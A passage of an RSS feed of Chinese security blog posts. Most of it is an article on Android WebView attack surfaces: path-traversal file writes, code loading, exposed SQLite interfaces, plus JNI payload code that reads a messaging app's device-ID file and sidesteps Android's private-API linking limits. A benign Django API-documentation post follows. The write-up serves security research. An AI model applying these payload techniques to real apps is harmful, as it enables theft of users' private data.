之类回调的方案，或是其他基于类似方案的开源通信库），如果应用接口设计不当，仍然存在被恶意页面通过 js 执行任意代码的可能。&lt;/p&gt;&lt;p&gt;&lt;b&gt;利用可写入的可执行文件&lt;/b&gt;&lt;/p&gt;&lt;p&gt;这一种攻击方式需要结合两种类型的漏洞，一是能在本地写入路径和内容可控的文件，二是应用中存在动态加载不可信代码的逻辑。逻辑漏洞不涉及内存破坏，利用起来非常稳定。另外此类漏洞调用逻辑相对复杂，可能较难通过完全自动化的方式扫描识别。&lt;/p&gt;&lt;p&gt;在 Android 中因为开发者不严谨造成任意文件写入的漏洞较为常见。首先是写文件的接口可能本身设计上就允许传入任意路径的参数，另一种情况就是直接拼接路径导致可以 “…/” 进行目录穿越。&lt;/p&gt;&lt;p&gt;常见的场景有：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;下载远程文件到指定的路径&lt;/li&gt;&lt;li&gt;解压 zip 文件时未对 ZipEntry 文件名进行合法性检查，可路径穿越&lt;/li&gt;&lt;li&gt;下载时未对 Content-Disposition: 进行合法性检查，可路径穿越&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;最后一个点比较少人注意到。&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition&quot;&gt;Content Disposition&lt;/a&gt; 是常见的 HTTP 协议 header，在文件下载时可以告诉客户端浏览器下载的文件名。例如服务器返回 Content-Disposition: attachment; filename=&quot;cool.html&quot; ，浏览器将弹出另存为对话框（或直接保存），默认的文件名就是 cool.html。&lt;/p&gt;&lt;p&gt;但这个 filename 参数显然是不可信任的。例如恶意网站返回的文件名包含 ../，当 Android 应用尝试将这个文件保存到 /sdcard/Downloads 时，攻击者就有机会把文件写入到 /data/ 目录中了：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-0679c320602b350418637272d477a53c_r.png&quot; data-rawwidth=&quot;1440&quot; data-rawheight=&quot;902&quot;&gt;&lt;p&gt;如果用户不小心点击确认下载，文件将会被写入到指定的位置。这种攻击甚至完全不需要 WebView 允许执行 Javascript（setJavaScriptEnabled(true)），只要简单在 HTTP 服务器中添加一个恶意 header 即可实现。&lt;/p&gt;&lt;p&gt;在写入文件后便是代码的加载。几种常见的 Android 下动态加载可执行代码的方式：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;DexClassLoader 动态载入应用可写入的 dex 可执行文件&lt;/li&gt;&lt;li&gt;java.lang.Runtime.exec 方法执行应用可写入的 elf 文件&lt;/li&gt;&lt;li&gt;System.load 和 System.loadLibrary 动态载入应用可写入的 elf 共享对象&lt;/li&gt;&lt;li&gt;本地代码使用 system、popen 等类似函数执行应用可写入的 elf 文件&lt;/li&gt;&lt;li&gt;本地代码使用 dlopen 载入应用可写入的 elf 共享对象&lt;/li&gt;&lt;li&gt;利用 Multidex 机制：&lt;a href=&quot;https://www.nowsecure.com/blog/2015/06/15/a-pattern-for-remote-code-execution-using-arbitrary-file-writes-and-multidex-applications/&quot;&gt;A Pattern for Remote Code Execution using Arbitrary File Writes and MultiDex Applications&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;如果应用动态加载代码之前未做签名校验，利用存在任意文件写入问题的 WebView 扩展接口进行覆盖，可实现稳定的任意代码执行。此外由于在文件系统中写入了可执行文件，还可以实现持久化攻击的效果。&lt;/p&gt;&lt;p&gt;&lt;b&gt;SQLite 接口&lt;/b&gt;&lt;/p&gt;&lt;p&gt;部分应用为 WebView 提供了可执行任意 SQL 语句的扩展接口，允许打开和查询文件名可控的数据库；除此之外，在 WebKit 中有一个比较少用的 WebDatabase 功能，已被 W3C 标准废弃，但 WebKit 和 Chromium 仍然保留了实现。SQLite3 中存在一些已知的攻击面（如 load_extension 和 fts3_tokenizer 等），因此浏览器的 WebSQL 对 SQL 中可查询的函数做了白名单限制。&lt;/p&gt;&lt;p&gt;但长亭安全实验室发现，即使是浏览器白名单中的 SQLite3 函数依然存在可利用的安全性问题，最终可实现一套利用在 Chrome 和 Safari 两大浏览器上通用的代码执行。此漏洞被用于 2017 年 Pwn2Own 黑客大赛上攻击 Safari 浏览器。&lt;b&gt;此漏洞影响所有支持 WebDatabase 的浏览器（Windows、Linux、macOS、iOS、Android 上的 Chrome、Safari），包括多个 App 厂商基于 blink 或 WebKit 分支开发的浏览器引擎，影响数量非常可观。&lt;/b&gt;漏洞目前已被 SQLite 和相关浏览器引擎修复。关于漏洞利用细节，长亭安全实验室将在 BlackHat 大会上进行详细讲解：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.blackhat.com/us-17/briefings/schedule/index.html#many-birds-one-stone-exploiting-a-single-sqlite-vulnerability-across-multiple-software-7024&quot;&gt;https://www.blackhat.com/us-17/briefings/schedule/index.html#many-birds-one-stone-exploiting-a-single-sqlite-vulnerability-across-multiple-software-7024&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-da02b6f502423f9df84571d9dcc86248_r.png&quot; data-rawwidth=&quot;1031&quot; data-rawheight=&quot;475&quot;&gt;&lt;p&gt;即使是做了权限限制的 WebDatabase 依然会出现问题，而我们不时可以看到一些应用直接将 SQLite 查询接口不做任何限制就暴露给了 WebView。这意味着使用之前已知的攻击方式（fts3_tokenizer、load_extension、attach 外部数据库等）将可以结合脚本的能力得到充分利用。&lt;/p&gt;&lt;p&gt;一些应用允许通过参数打开指定文件名，实现上存在任意路径拼接的漏洞。恶意页面可以打开任意 App 沙盒目录下任意数据库进行查询，将私有数据完全暴露给攻击者。&lt;/p&gt;&lt;p&gt;为了安全以及实际开发工程量考虑，我们建议在开发混合应用时，如需为 HTML5 应用提供离线存储能力，可直接使用 localStorage、IndexedDB 等 API。&lt;/p&gt;&lt;p&gt;&lt;b&gt;其他可通过扩展接口触发的问题&lt;/b&gt;&lt;/p&gt;&lt;p&gt;扩展接口在增强了 Web 内容的表现力的同时，也为应用增大了攻击面。一些需要本地才能触发的问题，如 Intent、ContentProvider 等，可以通过扩展接口提供的便利得以远程利用。&lt;/p&gt;&lt;p&gt;例如，使用 js 唤起 Activity 是很常见的功能；开启 setAllowContentAccess 后 WebView 可以通过 content:// 访问 ContentProvider，甚至扩展接口本身提供了这样的能力……这些原本需要本地安装恶意应用，需要导出 Activity、ContentProvider 才能触发的问题，可以被远程调用了。&lt;/p&gt;&lt;p&gt;应用本身的实现也有可能存在命令注入、允许 js 访问反射等安全问题。比如这篇文章介绍了某 Android 上的浏览器 App，存在任意文件写入、SQL 注入、XSS 等问题，最终可以跨域获取用户信息、远程执行代码：&lt;a href=&quot;http://d3adend.org/blog/?p=851&quot;&gt;http://d3adend.org/blog/?p=851&lt;/a&gt;&lt;/p&gt;&lt;p&gt;应用开发者在做接口的时候，不仅需要小心避免代码本身的安全漏洞，在 js 调用者的域上做好限制。&lt;/p&gt;&lt;h2&gt;从 shellcode 到攻击载荷&lt;/h2&gt;&lt;p&gt;由于目前（&amp;lt; Android O）默认没有启用隔离进程的 WebView，将浏览器引擎的漏洞移植到 Android 平台来攻击带 WebView 的应用。多数浏览器引擎漏洞利用会最终执行一段 shellcode。不过仅仅反弹一个 shell 显然不足以实现攻击 App，还要有针对性地调用一些 Android 虚拟机运行时的特性。&lt;/p&gt;&lt;p&gt;例如通过 App 权限读取短信、联系人，或者需要解密应用自身使用的某个 SQLite 数据库的内容，就需要使用 JNI 实现相应的逻辑。&lt;/p&gt;&lt;p&gt;&lt;b&gt;载荷的载入&lt;/b&gt;&lt;/p&gt;&lt;p&gt;就攻击特定应用的场景而言，将载荷完全使用 shellcode 甚至 ROP 并非不可能，但或多或少增加工作量。有一个 shell 之后可以做什么？很容易想到下载一个可执行文件然后加载。Android 没有自带 wget 或 curl，除非用户自行 root 并安装 busybox。不过有 xxd 命令可以使用，使用 echo 和管道重定向的方式还是可以实现下载可执行文件的。&lt;/p&gt;&lt;p&gt;如果不想在文件系统留下痕迹，手工模拟动态链接、重定位 ELF，可在内存中直接加载可执行文件。BadKernel 是一个利用了 V8 上游已经修补，但未及时同步到第三方 fork 中的漏洞，攻击某知名即时聊天应用的案例。在 &lt;a href=&quot;https://github.com/secmob/BadKernel/blob/master/exploit.html#L282&quot;&gt;BadKernel 的利用代码&lt;/a&gt; 中，调用 JNI 查询 ContentProvider 获取短信的逻辑是单独编译到一个 so 中的。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-26127902353e28f2005f0593cbd237d2_r.png&quot; data-rawwidth=&quot;1071&quot; data-rawheight=&quot;689&quot;&gt;&lt;p&gt;在作者公开的利用代码中，首先通过 javascript 任意地址读写，搜索一行调用 dlsym 的机器码，从中解析出 dlopen@plt 的地址，再加上三条指令的长度获得 dlsym@plt 的地址。触发任意代码执行时将这两个函数指针传入 shellcode，以进一步解析所需的各种符号。最后进入 shellcode 中实现的简化版 linker，直接将 ELF 文件内容放在 RWX 内存中重定位处理后，执行其 so_main 导出函数。&lt;/p&gt;&lt;p&gt;&lt;b&gt;JNI 基础&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Android 中 JVM 和 C/C++ 开发的本地代码互相调用，可以使用 JNI（Java Native Interface）。在 System.loadLibrary 载入一个动态链接库之后，JVM 会调用 ELF 中导出的 JNI_OnLoad(JavaVM *jvm, void *reserved) 函数，在这里可以做一些初始化的工作，以及使用 JNIEnv 的 RegisterNatives 方法动态将 Java 方法与本地代码绑定。&lt;/p&gt;&lt;p&gt;本地代码为 JNI 提供的方法的第一个参数是 JNIEnv 的指针，通过这个上下文可以访问 JVM 当前加载的类，通过反射机制调用 Java 层的功能。例如如下 Java 代码：&lt;/p&gt;&lt;code lang=&quot;java&quot;&gt;ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;MicroMsg/CompatibleInfo.cfg&quot;));
HashMap&amp;lt;Integer, String&amp;gt; hashMap = (HashMap&amp;lt;Integer, String&amp;gt;)ois.readObject();
String deviceId = hashMap.get(Integer.valueOf(258));
&lt;/code&gt;&lt;p&gt;使用 JNI 实现如下：&lt;/p&gt;&lt;code lang=&quot;cpp&quot;&gt;char *id = (char*)malloc(64);
jstring filename = (*env)-&amp;gt;NewStringUTF(env, &quot;MicroMsg/CompatibleInfo.cfg&quot;);
jclass clsFileInputStream = (*env)-&amp;gt;FindClass(env, &quot;java/io/FileInputStream&quot;);
jclass clsObjectInputStream = (*env)-&amp;gt;FindClass(env, &quot;java/io/ObjectInputStream&quot;);
jclass clsHashMap = (*env)-&amp;gt;FindClass(env, &quot;java/util/HashMap&quot;);

jmethodID constructor = (*env)-&amp;gt;GetMethodID(env, clsFileInputStream, &quot;&amp;lt;init&amp;gt;&quot;, &quot;(Ljava/lang/String;)V&quot;);
jobject fileInputStream = (*env)-&amp;gt;NewObject(env, clsFileInputStream, constructor, filename);

constructor = (*env)-&amp;gt;GetMethodID(env, clsObjectInputStream, &quot;&amp;lt;init&amp;gt;&quot;, &quot;(Ljava/io/InputStream;)V&quot;);
jobject objInputStream = (*env)-&amp;gt;NewObject(env, clsObjectInputStream, constructor, fileInputStream);
jmethodID readObject = (*env)-&amp;gt;GetMethodID(env, clsObjectInputStream, &quot;readObject&quot;, &quot;()Ljava/lang/Object;&quot;);
jobject hashmap = (*env)-&amp;gt;CallObjectMethod(env, objInputStream, readObject);

// cast to hash map
jmethodID get = (*env)-&amp;gt;GetMethodID(env, clsHashMap, &quot;get&quot;, &quot;(Ljava/lang/Object;)Ljava/lang/Object;&quot;);
jmethodID toString = (*env)-&amp;gt;GetMethodID(env, (*env)-&amp;gt;FindClass(env, &quot;java/lang/Object&quot;), &quot;toString&quot;, &quot;()Ljava/lang/String;&quot;);

jclass clsInteger = (*env)-&amp;gt;FindClass(env, &quot;java/lang/Integer&quot;);
jmethodID valueOf = (*env)-&amp;gt;GetStaticMethodID(env, clsInteger, &quot;valueOf&quot;, &quot;(I)Ljava/lang/Integer;&quot;);
jobject key = (*env)-&amp;gt;CallStaticObjectMethod(env, clsInteger, valueOf, 258);
jstring val = (*env)-&amp;gt;CallObjectMethod(env, hashmap, get, key);

strncpy(id, (*env)-&amp;gt;GetStringUTFChars(env, val, 0), len);
&lt;/code&gt;&lt;p&gt;正常情况下，JNIEnv 是系统初始化并传给 native 方法的。但在开发利用载荷的时候不是使用标准的方式加载链接库，因此需要使用一些私有 API。如果代码直接运行在 App 进程中，可通过 android::AndroidRuntime::getJNIEnv 直接获取，或者 JNI_GetCreatedJavaVMs 获得当前进程的唯一 JVM 实例后调用其 GetEnv 方法。如果使用独立的可执行文件，可通过 JNI_CreateJavaVM 创建一个新的 JVM。&lt;/p&gt;&lt;p&gt;&lt;b&gt;Android 调用 JVM 的一些问题&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://developer.android.com/about/versions/nougat/android-7.0-changes.html?hl=zh-cn#ndk&quot;&gt;Android N 对 NDK 链接的行为做了变更&lt;/a&gt;，禁止链接到私有 API，包括上文提到的 JVM 相关函数。一个非常简单的绕过方式是向 dlopen 传入空指针作为的文件名，dlsym 将会在所有已加载的共享对象中查找符号。&lt;/p&gt;&lt;code lang=&quot;cpp&quot;&gt;typedef jint (JNICALL *GetCreatedJavaVMs)(JavaVM **, jsize, jsize *);

void *handle = dlopen(NULL, RTLD_NOW);
GetCreatedJavaVMs JNI_GetCreatedJavaVMs =
    (GetCreatedJavaVMs) dlsym(handle, &quot;JNI_GetCreatedJavaVMs&quot;);
&lt;/code&gt;&lt;p&gt;另外一个坑是，在 ART 下，一个可执行文件如果要调用 JNI_CreateJavaVM 创建 JVM，那么它必须导出 InitializeSignalChain、ClaimSignalChain、UnclaimSignalChain、InvokeUserSignalHandler、EnsureFrontOfChain 这几个回调函数，否则会在 logcat 里看到大量类似&lt;br&gt;&quot;InitializeSignalChain is not exported by the main executable.&quot; 的提示，然后 SIGABRT。&lt;/p&gt;&lt;p&gt;AOSP 对应的代码如下，可以看到在输出这行日志之后就会调用 abort()：&lt;br&gt;&lt;a href=&quot;https://android.googlesource.com/platform/art/+/master/sigchainlib/sigchain_dummy.cc&quot;&gt;https://android.googlesource.com/platform/art/+/master/sigchainlib/sigchain_dummy.cc&lt;/a&gt;&lt;/p&gt;&lt;p&gt;解决方案非常简单，只要在源文件里创建这几个对应的函数，代码留空，然后加上 JNIEXPORT 宏设置为导出符号即可：&lt;/p&gt;&lt;code lang=&quot;cpp&quot;&gt;JNIEXPORT void InitializeSignalChain() { }
JNIEXPORT void ClaimSignalChain() { }
JNIEXPORT void UnclaimSignalChain() { }
JNIEXPORT void InvokeUserSignalHandler() { }
JNIEXPORT void EnsureFrontOfChain() { }
&lt;/code&gt;&lt;h2&gt;小结&lt;/h2&gt;&lt;p&gt;WebView 在 Android 应用开发中应用广泛，功能复杂，是颇为理想的攻击面。点开一个链接或者扫描一个二维码就会执行恶意代码并不仅仅是都市传说。开发者在使用 WebView 的时候不仅要注意老生常谈的各种 getSettings()、javascriptInterface 点，还要注意防范通过扩展接口暴露的攻击面和安全问题。&lt;/p&gt;&lt;h2&gt;参考资料&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition&quot; class=&quot;&quot;&gt;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.nowsecure.com/blog/2015/06/15/a-pattern-for-remote-code-execution-using-arbitrary-file-writes-and-multidex-applications/&quot;&gt;https://www.nowsecure.com/blog/2015/06/15/a-pattern-for-remote-code-execution-using-arbitrary-file-writes-and-multidex-applications/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://d3adend.org/blog/?p=851&quot;&gt;http://d3adend.org/blog/?p=851&lt;/a&gt; &lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://docs.oracle.com/javase/6/docs/technotes/guides/jni/spec/functions.html&quot;&gt;https://docs.oracle.com/javase/6/docs/technotes/guides/jni/spec/functions.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/secmob/BadKernel&quot;&gt;https://github.com/secmob/BadKernel&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://android.googlesource.com/&quot;&gt;https://android.googlesource.com/&lt;/a&gt;&lt;/li&gt;&lt;/ol&gt;</description>
<author>周知日</author>
<guid isPermaLink="false">2017-07-26-28107901</guid>
<pubDate>Wed, 26 Jul 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>测试驱动文档在后端 API 开发中的实践</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-07-24-28069225.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;测试驱动文档在后端 API 开发中的实践&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28069225&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-4b11f4ee60a743d551cd637892361629_r.png&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;很多人了解过 &lt;a href=&quot;https://docs.python.org/2/library/doctest.html&quot;&gt;Python 的 doctest&lt;/a&gt;，是从注释中写测试，我们现在反向思维，从测试生成文档。&lt;/p&gt;&lt;h2&gt;现状&lt;/h2&gt;&lt;p&gt;在开头有必要说明一下现在后端 API 的开发模式，这样才能更好的理解遇到的问题。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;框架: Django&lt;/li&gt;&lt;li&gt;给前端提供的都是 JSON API，没有后端渲染的网页&lt;/li&gt;&lt;li&gt;所有的 API 都继承 APIView，但是并不是 Django REST framework（以下简称 DRF，名字太长了） 中的 APIView，这个后面会说原因&lt;/li&gt;&lt;li&gt;使用 DRF 中的部分 serializer 来做数据格式验证和 QuerySet 转换为 Python 字典列表等类型的工作&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;DRF 库提供了很多我们并不会用到的功能，比如&lt;/p&gt;&lt;ul&gt;&lt;li&gt;登录验证，权限管理，API 版本号管理，限流、自动翻页等等，这些我们更侧重独立和手动的处理。&lt;/li&gt;&lt;li&gt;Generic Views 一直是一个让我感到疑惑的东西，看似写起来简单，代码量很少，像是填充一些预定义的变量和方法，简单的增删查改会方便一点，但是在实际复杂的业务场景下，可能导致问题复杂化，并没有显式的写出操作过程更清晰。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;所以我们仿照 DRF 的 APIView，继承 Django 的 View,自己写了一个新的 APIView，包含了核心功能，解析 JSON，同时增加了部分常用方法，比如 validate_serializer、self.success、self.error 和 self.paginate 等等。&lt;/p&gt;&lt;p&gt;下面是一段伪代码&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class UserProfileAPI(APIView):
    @validate_serializer(ChangeUserProfileSeralizer)
    def put(self):
        ....
        if err:
            return self.error(&quot;保存失败&quot;)
        return self.success(UserProfileSerailzier(user_profile).data)

class ProblemAPI(APIView):
    def get(self):
        return self.success(self.paginate(request,Problem.objects.all(), 
                            ProblemSerializer)))
&lt;/code&gt;&lt;h2&gt;现有的文档存在什么问题&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;没有文档，靠&quot;口口相传&quot;和&quot;心有灵犀&quot;。&lt;/li&gt;&lt;li&gt;手写 API 文档，不同人写出来的可能格式风格略有差异，也不容易统一管理。更重要的是人都是懒的，没有监督的情况下，文档能不写就不写，而测试还是要必须要写的。&lt;/li&gt;&lt;li&gt;一处修改很多 API 可能都会变，比如某一个 Model 修改了字段，很多 API 的返回值都可能受到影响，手动的逐个修改并不科学。&lt;/li&gt;&lt;li&gt;已有的文档生成工具自定义程度不高，比如 &lt;a href=&quot;https://github.com/marcgibbons/django-rest-swagger&quot;&gt;Django REST Swagger&lt;/a&gt; 要求 Generic Views 就放弃了。&lt;/li&gt;&lt;li&gt;还有些文档生成工具是在注释中使用特定的格式描述 API 字段和细节的，其实和手写文档没有本质上的差异。&lt;/li&gt;&lt;li&gt;上面几条总结一下就是：手写的文档很难自动化验证是否正确，测试生成文档可以保证和测试是一致的。&lt;/li&gt;&lt;li&gt;虽然&quot;代码即文档&quot;，但是也只适用于非 API 文档，比如数据库设计、架构设计、算法设计等，因为代码并不一定适合传播给所有人看，尤其是 API 文档一般都是对外的，而且代码中的注释经常是分散的，文档上一个 API 的说明、请求、响应等几部分数据可能分散在几个文件中。&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;我们的实践&lt;/h2&gt;&lt;p&gt;要改进上面的问题，基本原则是尽量少改动已有的代码，所以经过和 @reverland 的一番讨论，确定使用下面的方法：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;使用 serializer 生成数据格式描述性文档&lt;/li&gt;&lt;li&gt;使用部分测试充当 API 样例数据&lt;/li&gt;&lt;li&gt;CI 的时候，识别 commit 信息中的doc deploy 后生成和自动部署文本版文档和 Postman 导出格式&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;serializer 的文档&lt;/h2&gt;&lt;p&gt;由一个 serializer 生成对应的描述性文档相对是比较简单的，一个典型的 serializer 是这样的&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class IPOrSubnetField(serializers.CharField):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        if not kwargs.get(&quot;help_text&quot;):
            self.help_text = &quot;IPv4 的 IP 或者子网形式字符串&quot;

    def to_internal_value(self, data):
        pass

class CreateRuleSerializer(serializers.Serializer):
    &quot;&quot;&quot;
    一条规则可以封禁也可以限制频率，封禁的时候，不需要传递 e 和 f 字段。
    &quot;&quot;&quot;
    a = serializers.IntegerField(allow_null=True, required=False)
    b = serializers.CharField(allow_null=True, required=False)
    d = serializers.CharField(allow_null=True, required=False)
    d = serializers.ChoiceField(choices=[RuleAction.forbid, RuleAction.limit_rate])
    e = serializers.IntegerField(required=False, allow_null=True, min_value=1)
    f = serializers.IntegerField(required=False, allow_null=True, min_value=1)
    g = serializers.CharField(max_length=128, allow_blank=True, required=False)
    h = serializers.ListField(child=IPOrSubnetField())&lt;/code&gt;&lt;p&gt;下面是我们生成的表格文档&lt;/p&gt;&lt;p&gt;数据格式&lt;/p&gt;&lt;blockquote&gt;一条规则可以封禁也可以限制频率，封禁的时候，不需要传递 e 和 f 字段。&lt;/blockquote&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1a7a0507ee3eda5dd52945ec3351cf22_r.png&quot; data-rawwidth=&quot;678&quot; data-rawheight=&quot;475&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这个表格包含了字段名、数据类型、数据格式、字段额外说明等几部分信息。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;一个 serializer 的所有字段可以在 serializer.fields.items() 中得到，只要遍历一下所有的字段就不难再针对性的处理。&lt;/li&gt;&lt;li&gt;字段的类型很容易推断，is_instance(field, serializers.IntegerField) 等逐个的比较就可以知道。&lt;/li&gt;&lt;li&gt;几乎所有的字段都支持 required 和 null 参数，代表是否允许不传递该字段和是否允许该字段的值为 null。对于字符串类型和数据类型的字段等，还支持 max_length / max_value 和 min_length / min_value 参数，代表数据的范围，其他的个别格式限制可以参考下 DRF 的源码。&lt;/li&gt;&lt;li&gt;有的字段需要额外说明才方便理解，或者有些字段是互斥的，不可以同时传递，所以我们还是要支持在代码中自我描述的功能，这些说明有两处来源，一个是 serializer 的 doc string，另一个是 field 的 help_text 属性。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;在单元测试的时候，Client 会传递一个特殊的 HTTP 头，这样 @validate_serializer 就知道是否要生成 serializer 的文档了。&lt;/p&gt;&lt;h2&gt;API数据的文档&lt;/h2&gt;&lt;p&gt;一个 API 仅仅有数据格式的要求是不够的，最好还能够提供一些常见的正确和错误使用的例子，这样也可以帮助用户去更好的理解 API 的用途，单元测试的测试用例就是这些示例最好的来源。&lt;/p&gt;&lt;p&gt;一个典型的单元测试是这样子的&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class ACLAPITest(APITestCase):
    @document
    def test_create_acl_rule(self):
        &quot;&quot;&quot;
        创建 acl 规则，只有 cidr
        &quot;&quot;&quot;
        resp = self.client.post(self.url, data=self.base_rule)
        self.assertSuccess(resp)
        ...        
        return resp

    @document
    def test_edit_acl_rule(self):
        &quot;&quot;&quot;
        编辑 acl 规则
        &quot;&quot;&quot;
        rule_id = self.test_create_acl_rule_ip().data[&quot;data&quot;][&quot;id&quot;]
        ...
        resp = self.client.put(self.url, data=new_rule)
        self.assertSuccess(resp)
        ...
&lt;/code&gt;&lt;p&gt;这里测试创建和编辑 ACL 规则。@document 是标记这个测试用例要生成文档。我们通过修改 Client 的属性来实现。&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;def document(method):
    @functools.wraps(method)
    def handle(*args, **kwargs):
        if args[0]._testMethodName == method.__name__:
            args[0].client.test_method_name = args[0]._testMethodName
            args[0].client.doc = method.__doc__
            args[0].client.running_module = method.__module__.split(&quot;.&quot;)[0]
        ret = method(*args, **kwargs)
        return ret
    return handle
&lt;/code&gt;&lt;p&gt;要注意的是，只有修饰在当前正在执行的测试上，才会去更新这些属性，否则运行 test_edit_acl_rule 的时候，test_create_acl_rule 会把 Client 的属性改错。&lt;/p&gt;&lt;p&gt;测试中的 Client 就是一个生成 HTTP 请求，然后模拟发送请求的组件，要想记录下请求和响应的内容，替换掉 DRF 原生 Client 是必须的，当然这个也不难，只要继承原来的 Client，重载相关方法，记录请求数据，然后调用父类的方法，再记录响应数据就可以了。&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class DocumentAPIClient(APIClient):
    test_method_name = &quot;&quot;
    doc = &quot;&quot;
    running_module = &quot;&quot;

    def _request(self, method, *args, **kwargs):
        make_doc = self.test_method_name == inspect.stack()[2].function
        if make_doc:
            kwargs[&quot;serializer_gen_doc&quot;] = True
        # kwargs 中的额外参数，在 view 中 request.META 中可以取到，类似额外的 HTTP 头
        resp = getattr(super(), method)(*args, **kwargs)

        if make_doc:
            # 记录 API 请求和响应
            pass

class APITestCase(TestCase):
    client_class = DocumentAPIClient
&lt;/code&gt;&lt;p&gt;有几点是要注意的&lt;/p&gt;&lt;ul&gt;&lt;li&gt;测试用例存在嵌套关系的时候，比如 test_edit_acl_rule 中，我们只关心本测试中发送的请求，而不关心调用的 test_create_acl_rule 中发送的请求，所以 Client 需要根据代码调用栈来判断自己的位置。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;请求是在当前正在执行的 test_create_acl_rule 中发出的，那么函数栈是&lt;/p&gt;&lt;ul&gt;&lt;ul&gt;&lt;li&gt;self._request(0)&lt;/li&gt;&lt;li&gt;self.post…(1)&lt;/li&gt;&lt;li&gt;test_create_acl_rule(2)&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;p&gt;test_edit_acl_rule 中调用了 test_create_acl_rule 时，self.test_method_name == &quot;test_edit&quot;，而函数栈是&lt;/p&gt;&lt;ul&gt;&lt;ul&gt;&lt;li&gt;self._request(0)&lt;/li&gt;&lt;li&gt;self.post…(1)&lt;/li&gt;&lt;li&gt;test_create_acl_rule(2)&lt;/li&gt;&lt;li&gt;test_edit_acl_rule(3)&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;不是所有的 API 都是可 JSON 的，比如上传或者下载文件的请求，生成文档的时候需要特例处理下。可以写一个自定义的 JSON Encoder 来实现。&lt;/li&gt;&lt;/ul&gt;&lt;code lang=&quot;python&quot;&gt;class MultipartToJsonLikeEncoder(json.JSONEncoder):
     def default(self, o):
         if isinstance(o, io.BytesIO) or isinstance(o, io.StringIO):
             return &quot;&amp;lt;文件上传 💾 &amp;gt;&quot;
         return json.JSONEncoder.default(self, o)&lt;/code&gt;&lt;ul&gt;&lt;li&gt;生成文档的时候要排序，将响应正确的排在前面，响应错误的排在后面。&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;总结&lt;/h2&gt;&lt;p&gt;解决了已有的问题，而且鼓励开发者认真的去写更规范的测试&lt;/p&gt;&lt;ul&gt;&lt;li&gt;为了生成文档，至少会写一个简化版测试，总比没有测试要好&lt;/li&gt;&lt;li&gt;一个测试只干一件事情，否则生成的文档会有重复&lt;/li&gt;&lt;li&gt;测试中会写注释标明测试的用途&lt;/li&gt;&lt;/ul&gt;</description>
<author>CeleryL</author>
<guid isPermaLink="false">2017-07-24-28069225</guid>
<pubDate>Mon, 24 Jul 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>利用一个堆溢出漏洞实现VMware虚拟机逃逸</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-07-06-27733895.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;利用一个堆溢出漏洞实现VMware虚拟机逃逸&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/27733895&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
